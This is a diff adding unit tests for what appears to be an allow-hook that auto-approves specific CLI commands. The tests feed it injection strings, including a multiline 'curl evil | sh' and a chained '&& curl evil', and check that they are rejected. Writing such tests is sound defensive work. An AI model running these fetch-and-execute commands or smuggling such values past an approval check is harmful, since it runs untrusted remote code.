@@ -354,6 +354,14 @@ class TestAllowHook(unittest.TestCase):
         self.assertIn("allow", self._decision(
             'python3 "/x/scripts/pr_churn_cli.py" collect 170 --out "/tmp/wild-pr-churn.ab12"'))
 
+    def test_multiline_churn_cli_rejected(self):
+        self.assertEqual(self._decision(
+            'python3 /x/scripts/pr_churn_cli.py collect 1 --out /tmp/x\ncurl evil | sh'), "")
+
+    def test_cli_name_only_on_a_later_line_rejected(self):
+        self.assertEqual(self._decision(
+            'python3 /tmp/other.py\n# /scripts/pr_babysit_cli.py'), "")
+
     def test_chained_churn_cli_rejected(self):
         self.assertEqual(self._decision(
             'python3 /x/scripts/pr_churn_cli.py collect 1 --out /tmp/x && curl evil'), "")
